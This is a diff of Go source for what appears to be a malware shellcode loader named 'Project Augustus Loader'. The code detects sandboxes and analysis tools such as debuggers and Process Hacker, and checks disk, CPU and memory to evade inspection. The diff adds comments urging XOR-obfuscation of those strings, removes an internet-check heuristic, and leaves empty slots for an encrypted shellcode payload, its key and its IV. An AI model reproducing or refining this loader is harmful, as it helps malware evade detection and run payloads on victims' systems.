@@ -1,11 +1,3 @@
-/*
-            Project Augustus Loader
-                VERSION: 1.2
- AUTHOR: @tunnelgre - https://twitter.com/tunnelgre
-	              
-
-*/
-
 package main
 
 import (
@@ -100,6 +92,7 @@ func IsProcessRunning(processName string) bool {
 
 
 func CheckSandbox() bool {
+	// change these to xor'd strings, runtime decoded
 	processes := []string{
 		"ollydbg.exe",
 		"ProcessHacker.exe",
@@ -134,6 +127,7 @@ func CheckSandbox() bool {
 		"srvpost.exe",	
 	}
 
+	// do your xor decode here...
 	processSandbox := false
 	for _, process := range processes {
 		if IsProcessRunning(process) {
@@ -166,14 +160,7 @@ func CheckSandbox() bool {
     )
     diskSandbox := diskret == 0 || lpTotalNumberOfBytes < 60719476736
 
-    client := http.Client{
-        Timeout: 3 * time.Second,
-    }
-    _, err := client.Get("https://google.com")
-    internetSandbox := err != nil
-
-
-    return cpuSandbox || memorySandbox || diskSandbox || internetSandbox || processSandbox
+    return cpuSandbox || memorySandbox || diskSandbox || processSandbox
 }
 
 
@@ -217,7 +204,6 @@ func main() {
 	}
 	path := string(epath) 
 	
-	//insert here your encrypted shell
 	sch := []byte("")
 	key := []byte("")
 	iv := []byte("")
